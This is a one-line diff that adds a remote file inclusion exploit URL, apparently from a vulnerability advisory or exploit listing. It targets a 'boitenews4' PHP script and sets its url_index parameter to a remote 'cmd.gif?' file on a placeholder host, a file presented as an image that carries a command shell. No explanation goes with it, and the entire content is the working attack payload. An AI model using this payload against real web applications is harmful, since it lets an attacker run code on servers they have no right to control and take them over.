@@ -1,0 +1,1 @@
+http://www.example.com/[Path]/boitenews4/index.php?url_index=http://www.example.com/cmd.gif?
